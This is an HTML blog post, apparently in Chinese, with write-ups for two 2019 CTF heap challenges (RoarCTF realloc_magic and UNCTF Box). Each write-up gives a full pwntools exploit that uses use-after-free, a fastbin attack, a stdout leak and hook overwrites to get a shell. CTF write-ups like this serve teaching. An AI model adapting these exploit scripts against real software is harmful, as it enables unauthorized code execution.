@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        记两个关于realloc函数的pwn - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+     你若盛开，清风自来！ 
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            萝卜
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019-roarctf-realloc-magic"><span class="toc-text">2019-roarctf-realloc_magic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019-unctf-Box"><span class="toc-text">2019-unctf-Box</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        记两个关于realloc函数的pwn
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-10-29 16:29:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="2019-roarctf-realloc-magic"><a href="#2019-roarctf-realloc-magic" class="headerlink" title="2019-roarctf-realloc_magic"></a>2019-roarctf-realloc_magic</h2><p>题目环境在 <code>libc-2.27</code></p>
+<p>程序保护全开，提供了三个功能</p>
+<ul>
+<li>add：利用<code>realloc</code>函数创建chunk，<code>size</code>可控</li>
+<li>delete：<code>free</code>函数释放掉chunk，堆指针未置零，造成UAF</li>
+<li>br：提供一次可以将<code>realloc_ptr</code>置零的机会</li>
+</ul>
+<p><code>realloc</code>函数用法在上一篇已经总结过了，但是这道题值得注意的是，当物理地址相邻的chunk在<code>unsorted bin</code>的时候，如果够下次分配的总地址的话，会从<code>unsorted bin</code>中的<code>chunk</code>中进行分割，剩下的会进入相应的<code>bin</code>中</p>
+<p>攻击手法：</p>
+<ul>
+<li>首先控制chunk，造成合并，从而可以部分覆盖<code>main_arena</code>地址，使之指向<code>stdout</code></li>
+<li><code>fastbin attack</code>来修改<code>stdout</code>造成泄露<code>libc</code></li>
+<li>然后还是<code>fastbin attack</code>修改<code>hook</code>为<code>one_gg</code></li>
+</ul>
+<p>Exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">debug = 0</span><br><span class="line">file_name = &apos;./pwn&apos;</span><br><span class="line">libc_name = &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">ip = &apos;node3.buuoj.cn&apos;</span><br><span class="line">prot = &apos;28653&apos;</span><br><span class="line"></span><br><span class="line">file = ELF(file_name)</span><br><span class="line"></span><br><span class="line">sl = lambda x : r.sendline(x)</span><br><span class="line">sd = lambda x : r.send(x)</span><br><span class="line">sla = lambda x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = lambda x : r.recvuntil(x,drop=True,timeout=3)</span><br><span class="line">ru = lambda x : r.recvuntil(x)</span><br><span class="line">li = lambda name,x : log.info(name+&apos;:&apos;+hex(x))</span><br><span class="line">ri = lambda  : r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(chunk_size,value):</span><br><span class="line">    ru(&apos;&gt;&gt; &apos;)</span><br><span class="line">    sl(&apos;1&apos;)</span><br><span class="line">    ru(&apos;Size?&apos;)</span><br><span class="line">    sl(str(chunk_size))</span><br><span class="line">    ru(&apos;Content?&apos;)</span><br><span class="line">    sd(value)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">    ru(&apos;&gt;&gt; &apos;)</span><br><span class="line">    sl(&apos;2&apos;)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    # raw_input()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">	try:</span><br><span class="line">		r = process(&quot;./pwn&quot;)</span><br><span class="line">		#r = remote(ip,int(prot))</span><br><span class="line">		libc = ELF(libc_name)</span><br><span class="line">		create(0x68,&quot;a&quot;)</span><br><span class="line">		create(0,&quot;&quot;)#free</span><br><span class="line">		create(0x98,&quot;b&quot;)</span><br><span class="line">		create(0,&quot;&quot;)#free</span><br><span class="line">		create(0xa8,&quot;c&quot;)</span><br><span class="line">		create(0,&quot;&quot;)#free</span><br><span class="line">		create(0x98,&quot;d&quot;)</span><br><span class="line"></span><br><span class="line">		for x in range(7):</span><br><span class="line">		    delete()		</span><br><span class="line">		create(0,&quot;&quot;)#free</span><br><span class="line"></span><br><span class="line">		create(0x68,&quot;e&quot;)</span><br><span class="line">		#create(0x70,&quot;a&quot;)</span><br><span class="line">		create(0x100,&quot;a&quot;*0x68+p64(0x31)+&quot;\x60\x77&quot;)</span><br><span class="line">		create(0,&quot;&quot;)#free</span><br><span class="line">		create(0x98,&quot;f&quot;)</span><br><span class="line">		create(0,&quot;&quot;)#free</span><br><span class="line">		#debug()</span><br><span class="line">		create(0x98,p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;)</span><br><span class="line">		date = rud(&apos;&gt;&gt; &apos;)</span><br><span class="line">		if &quot;\x7f&quot; not in date:</span><br><span class="line">		    raise EOFError;</span><br><span class="line">		puts_sym = libc.symbols[&apos;puts&apos;]</span><br><span class="line">		li(&quot;puts_sym&quot;,puts_sym)</span><br><span class="line">		libc_base = u64(date[0x59:0x59+6]+&quot;\x00\x00&quot;)-0x3e82a0</span><br><span class="line">		li(&quot;libc_base&quot;,libc_base)</span><br><span class="line">		free_hook = libc_base+libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">		system = libc_base+ libc.symbols[&apos;system&apos;]</span><br><span class="line">		sl(&quot;666&quot;)</span><br><span class="line">		create(0x100,&quot;b&quot;*0x68+p64(0x41)+p64(free_hook))</span><br><span class="line">		create(0,&quot;&quot;)</span><br><span class="line">		create(0x20,&quot;a&quot;)</span><br><span class="line">		create(0,&quot;&quot;)</span><br><span class="line">		create(0x20,p64(system))</span><br><span class="line">		create(0,&quot;&quot;)</span><br><span class="line">		create(0x50,&quot;/bin/sh\x00&quot;)</span><br><span class="line">		delete()</span><br><span class="line">		debug()</span><br><span class="line">		ri()</span><br><span class="line">	except EOFError:</span><br><span class="line">	    r.close()</span><br></pre></td></tr></table></figure></p>
+<h2 id="2019-unctf-Box"><a href="#2019-unctf-Box" class="headerlink" title="2019-unctf-Box"></a>2019-unctf-Box</h2><p>这道题的关键就是数组溢出，<code>index</code>的数据类型是<code>int</code>类型,所以可以造成数组溢出</p>
+<p>edit时直接输入<code>-12</code>即可编辑<code>stdout</code>中的内容，然后就可以<code>leak libc</code>了</p>
+<p>然后<code>delete</code>的时候没有将指向<code>chunk</code>地址的地址置零，所以造成UAF，利用<code>fastbin attack</code>来修改<code>realloc_hook</code>为<code>one_gg</code></p>
+<p>但是最后拿shell的时候发现4个<code>one_gg</code>都不能拿到shell，这时候就要换一种思路了，<code>__realloc_hook</code>和<code>__malloc_hook</code>在一块，我们覆盖<code>__realloc_hook</code>为0，然后<code>__malloc_hook</code>覆盖为<code>one_gg</code>，然后通过create一个不是堆的地址，使程序报错，就会调用malloc，然后就可以获取到shell了</p>
+<p>Exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">debug = 0</span><br><span class="line">file_name = &apos;./Box&apos;</span><br><span class="line">libc_name = &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">ip = &apos;101.71.29.5&apos;</span><br><span class="line">prot = &apos;10035&apos;</span><br><span class="line"></span><br><span class="line">file = ELF(file_name)</span><br><span class="line"></span><br><span class="line">sl = lambda x : r.sendline(x)</span><br><span class="line">sd = lambda x : r.send(x)</span><br><span class="line">sla = lambda x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = lambda x : r.recvuntil(x,drop=True,timeout=1)</span><br><span class="line">ru = lambda x : r.recvuntil(x,timeout=1)</span><br><span class="line">li = lambda name,x : log.info(name+&apos;:&apos;+hex(x))</span><br><span class="line">ri = lambda  : r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(index,chunk_size):</span><br><span class="line">    ru(&apos;Your Choice: &apos;)</span><br><span class="line">    sl(&apos;1&apos;)</span><br><span class="line">    ru(&apos;Box ID: &apos;)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(&quot;Box Size: &quot;)</span><br><span class="line">    sl(str(chunk_size))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    ru(&apos;Your Choice: &apos;)</span><br><span class="line">    sl(&apos;3&apos;)</span><br><span class="line">    ru(&apos;Box ID: &apos;)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(index,value):</span><br><span class="line">    ru(&apos;Your Choice: &apos;)</span><br><span class="line">    sl(&apos;2&apos;)</span><br><span class="line">    ru(&apos;Box ID: &apos;)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(&apos;Box Content: &apos;)</span><br><span class="line">    sl(value)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">	try:</span><br><span class="line">		r = remote(ip,int(prot))</span><br><span class="line">		#r = process(&quot;./Box&quot;)</span><br><span class="line">		libc = ELF(libc_name)</span><br><span class="line">		edit(-12,p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;)</span><br><span class="line">		r.recv(0xc48)</span><br><span class="line">		libc_base = u64(r.recv(6,timeout=1).ljust(8,&apos;\x00&apos;))-0x3c56a3</span><br><span class="line">		puts_sym = libc.symbols[&apos;puts&apos;]</span><br><span class="line">		li(&quot;puts_sym&quot;,puts_sym)		</span><br><span class="line">		li(&quot;libc_base&quot;,libc_base)</span><br><span class="line">		if (libc_base&amp;0xffff)%0x1000!=0:</span><br><span class="line">			raise EOFError</span><br><span class="line">		__malloc_hook = libc_base + libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">		malloc_addr = libc_base + libc.symbols[&apos;malloc&apos;]</span><br><span class="line">		create(0,0x68)</span><br><span class="line">		create(1,0x68)</span><br><span class="line">		delete(0)</span><br><span class="line">		create(1,0)</span><br><span class="line">		create(0,0)</span><br><span class="line">		create(0,0x68)</span><br><span class="line">		edit(0,p64(__malloc_hook-0x23))</span><br><span class="line">		create(1,0x68)</span><br><span class="line">		create(2,0x68)</span><br><span class="line">		create(3,0x68)</span><br><span class="line">		one_gg = 0xf02a4+libc_base</span><br><span class="line">		edit(3,&quot;aaa&quot;+p64(0)*2+p64(one_gg))</span><br><span class="line">		# edit(1,&quot;\x00&quot;*0x68)</span><br><span class="line">		create(-12,0)</span><br><span class="line">		# debug()</span><br><span class="line">		ri()</span><br><span class="line">	except EOFError:</span><br><span class="line">	    r.close()</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure></p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
